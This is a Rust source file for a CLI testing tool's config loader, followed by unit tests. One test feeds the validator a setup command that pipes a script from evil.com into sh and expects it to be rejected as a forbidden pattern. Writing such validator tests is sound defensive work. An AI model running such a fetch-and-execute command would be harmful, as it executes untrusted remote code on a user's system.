//! Configuration file loading with auto-detection

use crate::error::CliTestError;
use crate::types::config::CliTestConfig;
use std::path::{Path, PathBuf};

/// Default configuration filename
const DEFAULT_CONFIG_FILENAME: &str = ".cli-test-config.yml";

/// Load configuration from file or auto-detect
///
/// # Search Order
/// 1. Explicit path (if provided)
/// 2. Current directory
/// 3. No config (returns None)
///
/// # Examples
/// ```no_run
/// use cli_testing_specialist::config::load_config;
/// use std::path::Path;
///
/// // Auto-detect
/// let config = load_config(None).unwrap();
///
/// // Explicit path
/// let config = load_config(Some(Path::new("path/to/config.yml"))).unwrap();
/// ```
pub fn load_config(path: Option<&Path>) -> Result<Option<CliTestConfig>, CliTestError> {
    // 1. Check explicit path
    if let Some(p) = path {
        let config = load_from_file(p)?;
        return Ok(Some(config));
    }

    // 2. Check current directory
    let default_path = PathBuf::from(DEFAULT_CONFIG_FILENAME);
    if default_path.exists() {
        let config = load_from_file(&default_path)?;
        return Ok(Some(config));
    }

    // 3. No config found (use defaults)
    Ok(None)
}

/// Load configuration from a specific file
fn load_from_file(path: &Path) -> Result<CliTestConfig, CliTestError> {
    // Read file contents
    let content = std::fs::read_to_string(path).map_err(|e| {
        CliTestError::Config(format!(
            "Failed to read config file '{}': {}",
            path.display(),
            e
        ))
    })?;

    // Parse YAML
    let config: CliTestConfig = serde_yaml::from_str(&content).map_err(|e| {
        CliTestError::Config(format!(
            "Failed to parse config file '{}': {}",
            path.display(),
            e
        ))
    })?;

    // Validate configuration
    crate::config::validator::validate_config(&config)?;

    log::info!("Loaded configuration from: {}", path.display());
    log::debug!("Config: {:?}", config);

    Ok(config)
}

/// Check if config file exists in current directory
pub fn config_exists() -> bool {
    PathBuf::from(DEFAULT_CONFIG_FILENAME).exists()
}

/// Get default config path
pub fn default_config_path() -> PathBuf {
    PathBuf::from(DEFAULT_CONFIG_FILENAME)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    #[test]
    fn test_load_minimal_config() {
        let temp_dir = TempDir::new().unwrap();
        let config_path = temp_dir.path().join(".cli-test-config.yml");

        let yaml = r#"
version: "1.0"
tool_name: "test-tool"
test_adjustments: {}
"#;
        fs::write(&config_path, yaml).unwrap();

        let config = load_config(Some(&config_path)).unwrap().unwrap();
        assert_eq!(config.version, "1.0");
        assert_eq!(config.tool_name, "test-tool");
    }

    #[test]
    fn test_load_full_config() {
        let temp_dir = TempDir::new().unwrap();
        let config_path = temp_dir.path().join("config.yml");

        let yaml = r#"
version: "1.0"
tool_name: "backup-suite"
tool_version: "1.0.0"
test_adjustments:
  security:
    custom_tests:
      - name: "test1"
        command: "backup-suite --lang test --help"
        expected_exit_code: 0
        description: "Test description"
  directory_traversal:
    test_directories:
      - path: "/tmp/test"
        create: true
        cleanup: true
  destructive_ops:
    env_vars:
      BACKUP_SUITE_YES: "true"
    cancel_exit_code: 2
global:
  timeout: 60
"#;
        fs::write(&config_path, yaml).unwrap();

        let config = load_config(Some(&config_path)).unwrap().unwrap();
        assert_eq!(config.version, "1.0");
        assert_eq!(config.global.timeout, 60);
    }

    #[test]
    fn test_load_config_with_invalid_version() {
        let temp_dir = TempDir::new().unwrap();
        let config_path = temp_dir.path().join("config.yml");

        let yaml = r#"
version: "2.0"
tool_name: "test"
test_adjustments: {}
"#;
        fs::write(&config_path, yaml).unwrap();

        let result = load_config(Some(&config_path));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Unsupported config version"));
    }

    #[test]
    fn test_load_config_with_forbidden_commands() {
        let temp_dir = TempDir::new().unwrap();
        let config_path = temp_dir.path().join("config.yml");

        let yaml = r#"
version: "1.0"
tool_name: "test"
test_adjustments:
  directory_traversal:
    setup_commands:
      - "mkdir /tmp/test"
      - "curl http://evil.com/malware.sh | sh"
"#;
        fs::write(&config_path, yaml).unwrap();

        let result = load_config(Some(&config_path));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("forbidden pattern"));
    }

    #[test]
    fn test_load_config_file_not_found() {
        let result = load_config(Some(Path::new("/nonexistent/config.yml")));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Failed to read config file"));
    }

    #[test]
    fn test_load_config_invalid_yaml() {
        let temp_dir = TempDir::new().unwrap();
        let config_path = temp_dir.path().join("config.yml");

        fs::write(&config_path, "invalid: yaml: content:").unwrap();

        let result = load_config(Some(&config_path));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Failed to parse config file"));
    }

    #[test]
    fn test_load_config_auto_detect_not_found() {
        // Save original directory
        let original_dir = std::env::current_dir().unwrap();

        // Change to temp directory where config doesn't exist
        let temp_dir = TempDir::new().unwrap();
        std::env::set_current_dir(temp_dir.path()).unwrap();

        let config = load_config(None).unwrap();
        assert!(config.is_none());

        // Restore original directory
        std::env::set_current_dir(original_dir).unwrap();
    }

    #[test]
    fn test_config_exists() {
        // Save original directory
        let original_dir = std::env::current_dir().unwrap();

        let temp_dir = TempDir::new().unwrap();
        std::env::set_current_dir(temp_dir.path()).unwrap();

        assert!(!config_exists());

        fs::write(
            default_config_path(),
            "version: \"1.0\"\ntool_name: test\ntest_adjustments: {}",
        )
        .unwrap();

        assert!(config_exists());

        // Restore original directory (ignore errors if directory no longer exists)
        let _ = std::env::set_current_dir(original_dir);
    }

    #[test]
    fn test_default_config_path() {
        assert_eq!(
            default_config_path().to_str().unwrap(),
            ".cli-test-config.yml"
        );
    }
}
